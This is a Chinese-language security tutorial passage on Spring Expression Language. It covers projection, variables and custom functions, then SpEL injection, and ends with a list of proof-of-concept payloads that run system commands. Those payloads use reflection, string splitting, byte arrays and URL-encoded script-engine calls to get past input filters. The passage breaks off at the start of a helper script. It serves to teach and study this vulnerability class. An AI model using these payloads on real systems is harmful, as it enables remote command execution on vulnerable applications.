<table><tbody><tr style="border-top: 1px solid rgb(204, 204, 204);background-color: white;border-right: none !important;border-bottom: none !important;border-left: none !important;"><td style="padding: 6px 13px;border-color: rgb(204, 204, 204);"><pre style="overflow: hidden;font-family: &#34;Source Code Pro&#34;, &#34;courier new&#34;, &#34;Input Mono&#34;, &#34;PT Mono&#34;, Consolas, Monaco, Menlo, monospace;font-size: 1em;padding: 10px;background-color: rgb(239, 242, 243);color: rgb(134, 145, 148);text-align: center;"><span style="height: 20px;line-height: 20px;">1</span><br/><span style="height: 20px;line-height: 20px;">2</span><br/><span style="height: 20px;line-height: 20px;">3</span><br/><span style="height: 20px;line-height: 20px;">4</span><br/><span style="height: 20px;line-height: 20px;">5</span><br/></pre></td><td style="padding: 6px 13px;border-color: rgb(204, 204, 204);font-size: 0.8rem;"><pre style="overflow: auto;font-family: &#34;Source Code Pro&#34;, &#34;courier new&#34;, &#34;Input Mono&#34;, &#34;PT Mono&#34;, Consolas, Monaco, Menlo, monospace;font-size: 1em;padding: 10px;background-color: rgb(246, 246, 246);"><span style="height: 20px;line-height: 20px;">Chicago</span><br/><span style="height: 20px;line-height: 20px;">Atlanta</span><br/><span style="height: 20px;line-height: 20px;">Dallas</span><br/><span style="height: 20px;line-height: 20px;">Houston</span><br/><span style="height: 20px;line-height: 20px;">El Paso</span><br/></pre></td></tr></tbody></table>#### 集合投影  
> 集合投影就是从集合的每一个成员中选择特定的属性放入到一个新的集合中。SpEL的投影运算符.![]完全可以做到这一点。  
> 例如，我们仅需要包含城市名称的一个String类型的集合：  
> <table><tbody><tr style="border-top: 1px solid rgb(204, 204, 204);background-color: white;border-right: none !important;border-bottom: none !important;border-left: none !important;"><td style="padding: 6px 13px;border-color: rgb(204, 204, 204);"><pre style="overflow: hidden;font-family: &#34;Source Code Pro&#34;, &#34;courier new&#34;, &#34;Input Mono&#34;, &#34;PT Mono&#34;, Consolas, Monaco, Menlo, monospace;font-size: 1em;padding: 10px;background-color: rgb(239, 242, 243);color: rgb(134, 145, 148);text-align: center;"><span style="height: 20px;line-height: 20px;">1</span><br/><span style="height: 20px;line-height: 20px;">2</span><br/></pre></td><td style="padding: 6px 13px;border-color: rgb(204, 204, 204);font-size: 0.8rem;"><pre style="overflow: auto;font-family: &#34;Source Code Pro&#34;, &#34;courier new&#34;, &#34;Input Mono&#34;, &#34;PT Mono&#34;, Consolas, Monaco, Menlo, monospace;font-size: 1em;padding: 10px;background-color: rgb(246, 246, 246);"><span style="height: 20px;line-height: 20px;">&gt; <span style="color: rgb(41, 115, 183);">&lt;<span style="color: rgb(82, 82, 82);">property</span> name=<span style="color: rgb(26, 188, 156);">&#34;cityNames&#34;</span> value=<span style="color: rgb(26, 188, 156);">&#34;#{cities.![name]}&#34;</span>/&gt;</span></span><br/><span style="height: 20px;line-height: 20px;">&gt;</span><br/></pre></td></tr></tbody></table>  
  
> 再比如，得到城市名字加州名的集合：  
> <table><tbody><tr style="border-top: 1px solid rgb(204, 204, 204);background-color: white;border-right: none !important;border-bottom: none !important;border-left: none !important;"><td style="padding: 6px 13px;border-color: rgb(204, 204, 204);"><pre style="overflow: hidden;font-family: &#34;Source Code Pro&#34;, &#34;courier new&#34;, &#34;Input Mono&#34;, &#34;PT Mono&#34;, Consolas, Monaco, Menlo, monospace;font-size: 1em;padding: 10px;background-color: rgb(239, 242, 243);color: rgb(134, 145, 148);text-align: center;"><span style="height: 20px;line-height: 20px;">1</span><br/><span style="height: 20px;line-height: 20px;">2</span><br/></pre></td><td style="padding: 6px 13px;border-color: rgb(204, 204, 204);font-size: 0.8rem;"><pre style="overflow: auto;font-family: &#34;Source Code Pro&#34;, &#34;courier new&#34;, &#34;Input Mono&#34;, &#34;PT Mono&#34;, Consolas, Monaco, Menlo, monospace;font-size: 1em;padding: 10px;background-color: rgb(246, 246, 246);"><span style="height: 20px;line-height: 20px;">&gt; &lt;property name=&#34;cityNames&#34; value=&#34;#{cities.![name+&#39;,&#39;+state]}&#34;/&gt;</span><br/><span style="height: 20px;line-height: 20px;">&gt;</span><br/></pre></td></tr></tbody></table>  
  
> 把符合条件的城市的名字和州名作为一个新的集合：  
> <table><tbody><tr style="border-top: 1px solid rgb(204, 204, 204);background-color: white;border-right: none !important;border-bottom: none !important;border-left: none !important;"><td style="padding: 6px 13px;border-color: rgb(204, 204, 204);"><pre style="overflow: hidden;font-family: &#34;Source Code Pro&#34;, &#34;courier new&#34;, &#34;Input Mono&#34;, &#34;PT Mono&#34;, Consolas, Monaco, Menlo, monospace;font-size: 1em;padding: 10px;background-color: rgb(239, 242, 243);color: rgb(134, 145, 148);text-align: center;"><span style="height: 20px;line-height: 20px;">1</span><br/><span style="height: 20px;line-height: 20px;">2</span><br/></pre></td><td style="padding: 6px 13px;border-color: rgb(204, 204, 204);font-size: 0.8rem;"><pre style="overflow: auto;font-family: &#34;Source Code Pro&#34;, &#34;courier new&#34;, &#34;Input Mono&#34;, &#34;PT Mono&#34;, Consolas, Monaco, Menlo, monospace;font-size: 1em;padding: 10px;background-color: rgb(246, 246, 246);"><span style="height: 20px;line-height: 20px;">&gt; <span style="color: rgb(41, 115, 183);">&lt;<span style="color: rgb(82, 82, 82);">property</span> name=<span style="color: rgb(26, 188, 156);">&#34;cityNames&#34;</span> value=<span style="color: rgb(26, 188, 156);">&#34;#{cities.?[population gt 100000].![name+&#39;,&#39;+state]}&#34;</span>/&gt;</span></span><br/><span style="height: 20px;line-height: 20px;">&gt;</span><br/></pre></td></tr></tbody></table>  
  
### 变量定义和引用  
  
在SpEL表达式中，变量定义通过EvaluationContext类的setVariable(variableName, value)函数来实现；在表达式中使用”#variableName”来引用；除了引用自定义变量，SpEL还允许引用根对象及当前上下文对象：  
- #this：使用当前正在计算的上下文；  
  
- #root：引用容器的root对象；  
  
示例，使用setVariable()函数定义了名为variable的变量，并且通过#variable来引用，同时尝试引用根对象和上下文对象：  
  
<table><tbody><tr style="border-top: 1px solid rgb(204, 204, 204);background-color: white;border-right: none !important;border-bottom: none !important;border-left: none !important;"><td style="padding: 6px 13px;border-color: rgb(204, 204, 204);"><pre style="overflow: hidden;font-family: &#34;Source Code Pro&#34;, &#34;courier new&#34;, &#34;Input Mono&#34;, &#34;PT Mono&#34;, Consolas, Monaco, Menlo, monospace;font-size: 1em;padding: 10px;background-color: rgb(239, 242, 243);color: rgb(134, 145, 148);text-align: center;"><span style="height: 20px;line-height: 20px;">1</span><br/><span style="height: 20px;line-height: 20px;">2</span><br/><span style="height: 20px;line-height: 20px;">3</span><br/><span style="height: 20px;line-height: 20px;">4</span><br/><span style="height: 20px;line-height: 20px;">5</span><br/><span style="height: 20px;line-height: 20px;">6</span><br/><span style="height: 20px;line-height: 20px;">7</span><br/><span style="height: 20px;line-height: 20px;">8</span><br/><span style="height: 20px;line-height: 20px;">9</span><br/></pre></td><td style="padding: 6px 13px;border-color: rgb(204, 204, 204);font-size: 0.8rem;"><pre style="overflow: auto;font-family: &#34;Source Code Pro&#34;, &#34;courier new&#34;, &#34;Input Mono&#34;, &#34;PT Mono&#34;, Consolas, Monaco, Menlo, monospace;font-size: 1em;padding: 10px;background-color: rgb(246, 246, 246);"><span style="height: 20px;line-height: 20px;">ExpressionParser parser = <span style="color: rgb(233, 105, 0);">new</span> SpelExpressionParser();</span><br/><span style="height: 20px;line-height: 20px;">EvaluationContext context = <span style="color: rgb(233, 105, 0);">new</span> StandardEvaluationContext(<span style="color: rgb(26, 188, 156);">&#34;mi1k7ea&#34;</span>);</span><br/><span style="height: 20px;line-height: 20px;">context.setVariable(<span style="color: rgb(26, 188, 156);">&#34;variable&#34;</span>, <span style="color: rgb(26, 188, 156);">&#34;666&#34;</span>);</span><br/><span style="height: 20px;line-height: 20px;">String result1 = parser.parseExpression(<span style="color: rgb(26, 188, 156);">&#34;#variable&#34;</span>).getValue(context, String.class);</span><br/><span style="height: 20px;line-height: 20px;">System.out.println(result1);</span><br/><span style="height: 20px;line-height: 20px;">String result2 = parser.parseExpression(<span style="color: rgb(26, 188, 156);">&#34;#root&#34;</span>).getValue(context, String.class);</span><br/><span style="height: 20px;line-height: 20px;">System.out.println(result2);</span><br/><span style="height: 20px;line-height: 20px;">String result3 = parser.parseExpression(<span style="color: rgb(26, 188, 156);">&#34;#this&#34;</span>).getValue(context, String.class);</span><br/><span style="height: 20px;line-height: 20px;">System.out.println(result3);</span><br/></pre></td></tr></tbody></table>  
输出：  
  
<table><tbody><tr style="border-top: 1px solid rgb(204, 204, 204);background-color: white;border-right: none !important;border-bottom: none !important;border-left: none !important;"><td style="padding: 6px 13px;border-color: rgb(204, 204, 204);"><pre style="overflow: hidden;font-family: &#34;Source Code Pro&#34;, &#34;courier new&#34;, &#34;Input Mono&#34;, &#34;PT Mono&#34;, Consolas, Monaco, Menlo, monospace;font-size: 1em;padding: 10px;background-color: rgb(239, 242, 243);color: rgb(134, 145, 148);text-align: center;"><span style="height: 20px;line-height: 20px;">1</span><br/><span style="height: 20px;line-height: 20px;">2</span><br/><span style="height: 20px;line-height: 20px;">3</span><br/></pre></td><td style="padding: 6px 13px;border-color: rgb(204, 204, 204);font-size: 0.8rem;"><pre style="overflow: auto;font-family: &#34;Source Code Pro&#34;, &#34;courier new&#34;, &#34;Input Mono&#34;, &#34;PT Mono&#34;, Consolas, Monaco, Menlo, monospace;font-size: 1em;padding: 10px;background-color: rgb(246, 246, 246);"><span style="height: 20px;line-height: 20px;">666</span><br/><span style="height: 20px;line-height: 20px;">mi1k7ea</span><br/><span style="height: 20px;line-height: 20px;">mi1k7ea</span><br/></pre></td></tr></tbody></table>### instanceof 表达式  
  
SpEL 支持 instanceof 运算符，跟 Java 内使用同义；如”‘haha’ instanceof T(String)”将返回 true。  
### 自定义函数  
  
目前只支持类静态方法注册为自定义函数。SpEL使用StandardEvaluationContext的registerFunction方法进行注册自定义函数，其实完全可以使用setVariable代替，两者其实本质是一样的。  
  
示例，用户自定义实现字符串反转的函数：  
  
<table><tbody><tr style="border-top: 1px solid rgb(204, 204, 204);background-color: white;border-right: none !important;border-bottom: none !important;border-left: none !important;"><td style="padding: 6px 13px;border-color: rgb(204, 204, 204);"><pre style="overflow: hidden;font-family: &#34;Source Code Pro&#34;, &#34;courier new&#34;, &#34;Input Mono&#34;, &#34;PT Mono&#34;, Consolas, Monaco, Menlo, monospace;font-size: 1em;padding: 10px;background-color: rgb(239, 242, 243);color: rgb(134, 145, 148);text-align: center;"><span style="height: 20px;line-height: 20px;">1</span><br/><span style="height: 20px;line-height: 20px;">2</span><br/><span style="height: 20px;line-height: 20px;">3</span><br/><span style="height: 20px;line-height: 20px;">4</span><br/><span style="height: 20px;line-height: 20px;">5</span><br/><span style="height: 20px;line-height: 20px;">6</span><br/><span style="height: 20px;line-height: 20px;">7</span><br/><span style="height: 20px;line-height: 20px;">8</span><br/><span style="height: 20px;line-height: 20px;">9</span><br/><span style="height: 20px;line-height: 20px;">10</span><br/><span style="height: 20px;line-height: 20px;">11</span><br/></pre></td><td style="padding: 6px 13px;border-color: rgb(204, 204, 204);font-size: 0.8rem;"><pre style="overflow: auto;font-family: &#34;Source Code Pro&#34;, &#34;courier new&#34;, &#34;Input Mono&#34;, &#34;PT Mono&#34;, Consolas, Monaco, Menlo, monospace;font-size: 1em;padding: 10px;background-color: rgb(246, 246, 246);"><span style="height: 20px;line-height: 20px;"><span style="color: rgb(233, 105, 0);">package</span> com.mi1k7ea;</span><br/><span style="height: 20px;line-height: 20px;"></span><br/><span style="height: 20px;line-height: 20px;"><span style="color: rgb(233, 105, 0);">public</span> <span style="color: rgb(41, 115, 183);"><span style="color: rgb(233, 105, 0);">class</span> UserFunc </span>{</span><br/><span style="height: 20px;line-height: 20px;">    <span style="color: rgb(82, 82, 82);"><span style="color: rgb(0, 146, 219);">public</span> <span style="color: rgb(0, 146, 219);">static</span> String reverseString(String input) </span>{</span><br/><span style="height: 20px;line-height: 20px;">        StringBuilder backwards = <span style="color: rgb(233, 105, 0);">new</span> StringBuilder();</span><br/><span style="height: 20px;line-height: 20px;">        <span style="color: rgb(233, 105, 0);">for</span> (<span style="color: rgb(233, 105, 0);">int</span> i = <span style="color: rgb(174, 129, 255);">0</span>; i &lt; input.length(); i++) {</span><br/><span style="height: 20px;line-height: 20px;">            backwards.append(input.charAt(input.length() - <span style="color: rgb(174, 129, 255);">1</span> - i));</span><br/><span style="height: 20px;line-height: 20px;">        }</span><br/><span style="height: 20px;line-height: 20px;">        <span style="color: rgb(233, 105, 0);">return</span> backwards.toString();</span><br/><span style="height: 20px;line-height: 20px;">    }</span><br/><span style="height: 20px;line-height: 20px;">}</span><br/></pre></td></tr></tbody></table>  
通过如下代码将方法注册到StandardEvaluationContext并且来使用它：  
  
<table><tbody><tr style="border-top: 1px solid rgb(204, 204, 204);background-color: white;border-right: none !important;border-bottom: none !important;border-left: none !important;"><td style="padding: 6px 13px;border-color: rgb(204, 204, 204);"><pre style="overflow: hidden;font-family: &#34;Source Code Pro&#34;, &#34;courier new&#34;, &#34;Input Mono&#34;, &#34;PT Mono&#34;, Consolas, Monaco, Menlo, monospace;font-size: 1em;padding: 10px;background-color: rgb(239, 242, 243);color: rgb(134, 145, 148);text-align: center;"><span style="height: 20px;line-height: 20px;">1</span><br/><span style="height: 20px;line-height: 20px;">2</span><br/><span style="height: 20px;line-height: 20px;">3</span><br/><span style="height: 20px;line-height: 20px;">4</span><br/><span style="height: 20px;line-height: 20px;">5</span><br/></pre></td><td style="padding: 6px 13px;border-color: rgb(204, 204, 204);font-size: 0.8rem;"><pre style="overflow: auto;font-family: &#34;Source Code Pro&#34;, &#34;courier new&#34;, &#34;Input Mono&#34;, &#34;PT Mono&#34;, Consolas, Monaco, Menlo, monospace;font-size: 1em;padding: 10px;background-color: rgb(246, 246, 246);"><span style="height: 20px;line-height: 20px;">ExpressionParser parser = <span style="color: rgb(233, 105, 0);">new</span> SpelExpressionParser();</span><br/><span style="height: 20px;line-height: 20px;">StandardEvaluationContext context = <span style="color: rgb(233, 105, 0);">new</span> StandardEvaluationContext();</span><br/><span style="height: 20px;line-height: 20px;">context.registerFunction(<span style="color: rgb(26, 188, 156);">&#34;reverseString&#34;</span>, UserFunc.class.getDeclaredMethod(<span style="color: rgb(26, 188, 156);">&#34;reverseString&#34;</span>, <span style="color: rgb(233, 105, 0);">new</span> Class[] { String.class }));</span><br/><span style="height: 20px;line-height: 20px;">String helloWorldReversed = parser.parseExpression(<span style="color: rgb(26, 188, 156);">&#34;#reverseString(&#39;mi1k7ea&#39;)&#34;</span>).getValue(context, String.class);</span><br/><span style="height: 20px;line-height: 20px;">System.out.println(helloWorldReversed);</span><br/></pre></td></tr></tbody></table>  
输出反转的字符串ae7k1im。  
## 0x02 SpEL表达式注入漏洞  
### 漏洞原理  
  
SimpleEvaluationContext和StandardEvaluationContext是SpEL提供的两个EvaluationContext：  
- SimpleEvaluationContext - 针对不需要SpEL语言语法的全部范围并且应该受到有意限制的表达式类别，公开SpEL语言特性和配置选项的子集。  
  
- StandardEvaluationContext - 公开全套SpEL语言功能和配置选项。您可以使用它来指定默认的根对象并配置每个可用的评估相关策略。  
  
SimpleEvaluationContext旨在仅支持SpEL语言语法的一个子集，不包括 Java类型引用、构造函数和bean引用；而StandardEvaluationContext是支持全部SpEL语法的。  
  
由前面知道，SpEL表达式是可以操作类及其方法的，可以通过类类型表达式T(Type)来调用任意类方法。这是因为在不指定EvaluationContext的情况下默认采用的是StandardEvaluationContext，而它包含了SpEL的所有功能，在允许用户控制输入的情况下可以成功造成任意命令执行。  
  
如下，前面的例子中已提过：  
  
<table><tbody><tr style="border-top: 1px solid rgb(204, 204, 204);background-color: white;border-right: none !important;border-bottom: none !important;border-left: none !important;"><td style="padding: 6px 13px;border-color: rgb(204, 204, 204);"><pre style="overflow: hidden;font-family: &#34;Source Code Pro&#34;, &#34;courier new&#34;, &#34;Input Mono&#34;, &#34;PT Mono&#34;, Consolas, Monaco, Menlo, monospace;font-size: 1em;padding: 10px;background-color: rgb(239, 242, 243);color: rgb(134, 145, 148);text-align: center;"><span style="height: 20px;line-height: 20px;">1</span><br/><span style="height: 20px;line-height: 20px;">2</span><br/><span style="height: 20px;line-height: 20px;">3</span><br/><span style="height: 20px;line-height: 20px;">4</span><br/><span style="height: 20px;line-height: 20px;">5</span><br/><span style="height: 20px;line-height: 20px;">6</span><br/><span style="height: 20px;line-height: 20px;">7</span><br/><span style="height: 20px;line-height: 20px;">8</span><br/><span style="height: 20px;line-height: 20px;">9</span><br/><span style="height: 20px;line-height: 20px;">10</span><br/><span style="height: 20px;line-height: 20px;">11</span><br/><span style="height: 20px;line-height: 20px;">12</span><br/><span style="height: 20px;line-height: 20px;">13</span><br/><span style="height: 20px;line-height: 20px;">14</span><br/></pre></td><td style="padding: 6px 13px;border-color: rgb(204, 204, 204);font-size: 0.8rem;"><pre style="overflow: auto;font-family: &#34;Source Code Pro&#34;, &#34;courier new&#34;, &#34;Input Mono&#34;, &#34;PT Mono&#34;, Consolas, Monaco, Menlo, monospace;font-size: 1em;padding: 10px;background-color: rgb(246, 246, 246);"><span style="height: 20px;line-height: 20px;"><span style="color: rgb(233, 105, 0);">package</span> com.mi1k7ea;</span><br/><span style="height: 20px;line-height: 20px;"></span><br/><span style="height: 20px;line-height: 20px;"><span style="color: rgb(233, 105, 0);">import</span> org.springframework.expression.Expression;</span><br/><span style="height: 20px;line-height: 20px;"><span style="color: rgb(233, 105, 0);">import</span> org.springframework.expression.ExpressionParser;</span><br/><span style="height: 20px;line-height: 20px;"><span style="color: rgb(233, 105, 0);">import</span> org.springframework.expression.spel.standard.SpelExpressionParser;</span><br/><br/><span style="height: 20px;line-height: 20px;"><span style="color: rgb(233, 105, 0);">public</span> <span style="color: rgb(41, 115, 183);"><span style="color: rgb(233, 105, 0);">class</span> MainApp </span>{</span><br/><span style="height: 20px;line-height: 20px;">    <span style="color: rgb(82, 82, 82);"><span style="color: rgb(0, 146, 219);">public</span> <span style="color: rgb(0, 146, 219);">static</span> <span style="color: rgb(0, 146, 219);">void</span> main(String[] args) <span style="color: rgb(0, 146, 219);">throws</span> Exception </span>{</span><br/><span style="height: 20px;line-height: 20px;">        String spel = <span style="color: rgb(26, 188, 156);">&#34;T(java.lang.Runtime).getRuntime().exec(\&#34;calc\&#34;)&#34;</span>;</span><br/><span style="height: 20px;line-height: 20px;">        ExpressionParser parser = <span style="color: rgb(233, 105, 0);">new</span> SpelExpressionParser();</span><br/><span style="height: 20px;line-height: 20px;">        Expression expression = parser.parseExpression(spel);</span><br/><span style="height: 20px;line-height: 20px;">        System.out.println(expression.getValue());</span><br/><span style="height: 20px;line-height: 20px;">    }</span><br/><span style="height: 20px;line-height: 20px;">}</span><br/></pre></td></tr></tbody></table>  
运行弹计算器：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/3ZX4O1QxGtODaMJLPwNY6oO2an0xjU1Da4MbP8stf2G1MIcodfiaTNAhZ5h8wBuIhCGE4JNCepF3GMIJLFicWVxw/640?wx_fmt=png&from=appmsg "")  
### PoC&Bypass整理  
  
下面我们来整理下各种利用的PoC，这里默认把定界符#{}去掉。  
  
<table><tbody><tr style="border-top: 1px solid rgb(204, 204, 204);background-color: white;border-right: none !important;border-bottom: none !important;border-left: none !important;"><td style="padding: 6px 13px;border-color: rgb(204, 204, 204);"><pre style="overflow: hidden;font-family: &#34;Source Code Pro&#34;, &#34;courier new&#34;, &#34;Input Mono&#34;, &#34;PT Mono&#34;, Consolas, Monaco, Menlo, monospace;font-size: 1em;padding: 10px;background-color: rgb(239, 242, 243);color: rgb(134, 145, 148);text-align: center;"><span style="height: 20px;line-height: 20px;">1</span><br/><span style="height: 20px;line-height: 20px;">2</span><br/><span style="height: 20px;line-height: 20px;">3</span><br/><span style="height: 20px;line-height: 20px;">4</span><br/><span style="height: 20px;line-height: 20px;">5</span><br/><span style="height: 20px;line-height: 20px;">6</span><br/><span style="height: 20px;line-height: 20px;">7</span><br/><span style="height: 20px;line-height: 20px;">8</span><br/><span style="height: 20px;line-height: 20px;">9</span><br/><span style="height: 20px;line-height: 20px;">10</span><br/><span style="height: 20px;line-height: 20px;">11</span><br/><span style="height: 20px;line-height: 20px;">12</span><br/><span style="height: 20px;line-height: 20px;">13</span><br/><span style="height: 20px;line-height: 20px;">14</span><br/><span style="height: 20px;line-height: 20px;">15</span><br/><span style="height: 20px;line-height: 20px;">16</span><br/><span style="height: 20px;line-height: 20px;">17</span><br/><span style="height: 20px;line-height: 20px;">18</span><br/><span style="height: 20px;line-height: 20px;">19</span><br/><span style="height: 20px;line-height: 20px;">20</span><br/><span style="height: 20px;line-height: 20px;">21</span><br/><span style="height: 20px;line-height: 20px;">22</span><br/><span style="height: 20px;line-height: 20px;">23</span><br/><span style="height: 20px;line-height: 20px;">24</span><br/><span style="height: 20px;line-height: 20px;">25</span><br/><span style="height: 20px;line-height: 20px;">26</span><br/><span style="height: 20px;line-height: 20px;">27</span><br/><span style="height: 20px;line-height: 20px;">28</span><br/><span style="height: 20px;line-height: 20px;">29</span><br/><span style="height: 20px;line-height: 20px;">30</span><br/><span style="height: 20px;line-height: 20px;">31</span><br/><span style="height: 20px;line-height: 20px;">32</span><br/><span style="height: 20px;line-height: 20px;">33</span><br/><span style="height: 20px;line-height: 20px;">34</span><br/><span style="height: 20px;line-height: 20px;">35</span><br/><span style="height: 20px;line-height: 20px;">36</span><br/><span style="height: 20px;line-height: 20px;">37</span><br/><span style="height: 20px;line-height: 20px;">38</span><br/><span style="height: 20px;line-height: 20px;">39</span><br/><span style="height: 20px;line-height: 20px;">40</span><br/><span style="height: 20px;line-height: 20px;">41</span><br/><span style="height: 20px;line-height: 20px;">42</span><br/><span style="height: 20px;line-height: 20px;">43</span><br/><span style="height: 20px;line-height: 20px;">44</span><br/><span style="height: 20px;line-height: 20px;">45</span><br/><span style="height: 20px;line-height: 20px;">46</span><br/><span style="height: 20px;line-height: 20px;">47</span><br/><span style="height: 20px;line-height: 20px;">48</span><br/><span style="height: 20px;line-height: 20px;">49</span><br/><span style="height: 20px;line-height: 20px;">50</span><br/><span style="height: 20px;line-height: 20px;">51</span><br/></pre></td><td style="padding: 6px 13px;border-color: rgb(204, 204, 204);font-size: 0.8rem;"><pre style="overflow: auto;font-family: &#34;Source Code Pro&#34;, &#34;courier new&#34;, &#34;Input Mono&#34;, &#34;PT Mono&#34;, Consolas, Monaco, Menlo, monospace;font-size: 1em;padding: 10px;background-color: rgb(246, 246, 246);"><span style="height: 20px;line-height: 20px;">// PoC原型</span><br/><span style="height: 20px;line-height: 20px;"></span><br/><span style="height: 20px;line-height: 20px;">// Runtime</span><br/><span style="height: 20px;line-height: 20px;">T(java.lang.Runtime).getRuntime().exec(&#34;calc&#34;)</span><br/><span style="height: 20px;line-height: 20px;">T(Runtime).getRuntime().exec(&#34;calc&#34;)</span><br/><br/><span style="height: 20px;line-height: 20px;">// ProcessBuilder</span><br/><span style="height: 20px;line-height: 20px;">new java.lang.ProcessBuilder({&#39;calc&#39;}).start()</span><br/><span style="height: 20px;line-height: 20px;">new ProcessBuilder({&#39;calc&#39;}).start()</span><br/><br/><span style="height: 20px;line-height: 20px;">******************************************************************************</span><br/><span style="height: 20px;line-height: 20px;">// Bypass技巧</span><br/><br/><span style="height: 20px;line-height: 20px;">// 反射调用</span><br/><span style="height: 20px;line-height: 20px;">T(String).getClass().forName(&#34;java.lang.Runtime&#34;).getRuntime().exec(&#34;calc&#34;)</span><br/><br/><span style="height: 20px;line-height: 20px;">// 同上，需要有上下文环境</span><br/><span style="height: 20px;line-height: 20px;">#this.getClass().forName(&#34;java.lang.Runtime&#34;).getRuntime().exec(&#34;calc&#34;)</span><br/><br/><span style="height: 20px;line-height: 20px;">// 反射调用+字符串拼接，绕过如javacon题目中的正则过滤</span><br/><span style="height: 20px;line-height: 20px;">T(String).getClass().forName(&#34;java.l&#34;+&#34;ang.Ru&#34;+&#34;ntime&#34;).getMethod(&#34;ex&#34;+&#34;ec&#34;,T(String[])).invoke(T(String).getClass().forName(&#34;java.l&#34;+&#34;ang.Ru&#34;+&#34;ntime&#34;).getMethod(&#34;getRu&#34;+&#34;ntime&#34;).invoke(T(String).getClass().forName(&#34;java.l&#34;+&#34;ang.Ru&#34;+&#34;ntime&#34;)),new String[]{&#34;cmd&#34;,&#34;/C&#34;,&#34;calc&#34;})</span><br/><br/><span style="height: 20px;line-height: 20px;">// 同上，需要有上下文环境</span><br/><span style="height: 20px;line-height: 20px;">#this.getClass().forName(&#34;java.l&#34;+&#34;ang.Ru&#34;+&#34;ntime&#34;).getMethod(&#34;ex&#34;+&#34;ec&#34;,T(String[])).invoke(T(String).getClass().forName(&#34;java.l&#34;+&#34;ang.Ru&#34;+&#34;ntime&#34;).getMethod(&#34;getRu&#34;+&#34;ntime&#34;).invoke(T(String).getClass().forName(&#34;java.l&#34;+&#34;ang.Ru&#34;+&#34;ntime&#34;)),new String[]{&#34;cmd&#34;,&#34;/C&#34;,&#34;calc&#34;})</span><br/><br/><span style="height: 20px;line-height: 20px;">// 当执行的系统命令被过滤或者被URL编码掉时，可以通过String类动态生成字符，Part1</span><br/><span style="height: 20px;line-height: 20px;">// byte数组内容的生成后面有脚本</span><br/><span style="height: 20px;line-height: 20px;">new java.lang.ProcessBuilder(new java.lang.String(new byte[]{99,97,108,99})).start()</span><br/><br/><span style="height: 20px;line-height: 20px;">// 当执行的系统命令被过滤或者被URL编码掉时，可以通过String类动态生成字符，Part2</span><br/><span style="height: 20px;line-height: 20px;">// byte数组内容的生成后面有脚本</span><br/><span style="height: 20px;line-height: 20px;">T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(108)).concat(T(java.lang.Character).toString(99)))</span><br/><br/><span style="height: 20px;line-height: 20px;">// JavaScript引擎通用PoC</span><br/><span style="height: 20px;line-height: 20px;">T(javax.script.ScriptEngineManager).newInstance().getEngineByName(&#34;nashorn&#34;).eval(&#34;s=[3];s[0]=&#39;cmd&#39;;s[1]=&#39;/C&#39;;s[2]=&#39;calc&#39;;java.la&#34;+&#34;ng.Run&#34;+&#34;time.getRu&#34;+&#34;ntime().ex&#34;+&#34;ec(s);&#34;)</span><br/><br/><span style="height: 20px;line-height: 20px;">T(org.springframework.util.StreamUtils).copy(T(javax.script.ScriptEngineManager).newInstance().getEngineByName(&#34;JavaScript&#34;).eval(&#34;xxx&#34;),)</span><br/><br/><span style="height: 20px;line-height: 20px;">// JavaScript引擎+反射调用</span><br/><span style="height: 20px;line-height: 20px;">T(org.springframework.util.StreamUtils).copy(T(javax.script.ScriptEngineManager).newInstance().getEngineByName(&#34;JavaScript&#34;).eval(T(String).getClass().forName(&#34;java.l&#34;+&#34;ang.Ru&#34;+&#34;ntime&#34;).getMethod(&#34;ex&#34;+&#34;ec&#34;,T(String[])).invoke(T(String).getClass().forName(&#34;java.l&#34;+&#34;ang.Ru&#34;+&#34;ntime&#34;).getMethod(&#34;getRu&#34;+&#34;ntime&#34;).invoke(T(String).getClass().forName(&#34;java.l&#34;+&#34;ang.Ru&#34;+&#34;ntime&#34;)),new String[]{&#34;cmd&#34;,&#34;/C&#34;,&#34;calc&#34;})),)</span><br/><br/><span style="height: 20px;line-height: 20px;">// JavaScript引擎+URL编码</span><br/><span style="height: 20px;line-height: 20px;">// 其中URL编码内容为：</span><br/><span style="height: 20px;line-height: 20px;">// 不加最后的getInputStream()也行，因为弹计算器不需要回显</span><br/><span style="height: 20px;line-height: 20px;">T(org.springframework.util.StreamUtils).copy(T(javax.script.ScriptEngineManager).newInstance().getEngineByName(&#34;JavaScript&#34;).eval(T(java.net.URLDecoder).decode(&#34;%6a%61%76%61%2e%6c%61%6e%67%2e%52%75%6e%74%69%6d%65%2e%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%22%63%61%6c%63%22%29%2e%67%65%74%49%6e%70%75%74%53%74%72%65%61%6d%28%29&#34;)),)</span><br/><br/><span style="height: 20px;line-height: 20px;">// 黑名单过滤&#34;.getClass(&#34;，可利用数组的方式绕过，还未测试成功</span><br/><span style="height: 20px;line-height: 20px;">&#39;&#39;[&#39;class&#39;].forName(&#39;java.lang.Runtime&#39;).getDeclaredMethods()[15].invoke(&#39;&#39;[&#39;class&#39;].forName(&#39;java.lang.Runtime&#39;).getDeclaredMethods()[7].invoke(null),&#39;calc&#39;)</span><br/><br/><span style="height: 20px;line-height: 20px;">// JDK9新增的shell，还未测试</span><br/><span style="height: 20px;line-height: 20px;">T(SomeWhitelistedClassNotPartOfJDK).ClassLoader.loadClass(&#34;jdk.jshell.JShell&#34;,true).Methods[6].invoke(null,{}).eval(&#39;whatever java code in one statement&#39;).toString()</span><br/></pre></td></tr></tbody></table>  
CreateAscii.py，用于String类动态生成字符的字符ASCII码转换生成：  
  
<table><tbody><tr style="border-top: 1px solid rgb(204, 204, 204);background-color: white;border-right: none !important;border-bottom: none !important;border-left: none !important;"><td style="padding: 6px 13px;border-color: rgb(204, 204, 204);"><pre style="overflow: hidden;font-family: &#34;Source Code Pro&#34;, &#34;courier new&#34;, &#34;Input Mono&#34;, &#34;PT Mono&#34;, Consolas, Monaco, Menlo, monospace;font-size: 1em;padding: 10px;background-color: rgb(239, 242, 243);color: rgb(134, 145, 148);text-align: center;"><span style="height: 20px;line-height: 20px;">1</span><br/><span style="height: 20px;line-height: 20px;">2</span><br/><span style="height: 20px;line-height: 20px;">3</span><br/><span style="height: 20px;line-height: 20px;">4</span><br/><span style="height: 20px;line-height: 20px;">5</span><br/><span style="height: 20px;line-height: 20px;">6</span><br/><span style="height: 20px;line-height: 20px;">7</span><br/><span style="height: 20px;line-height: 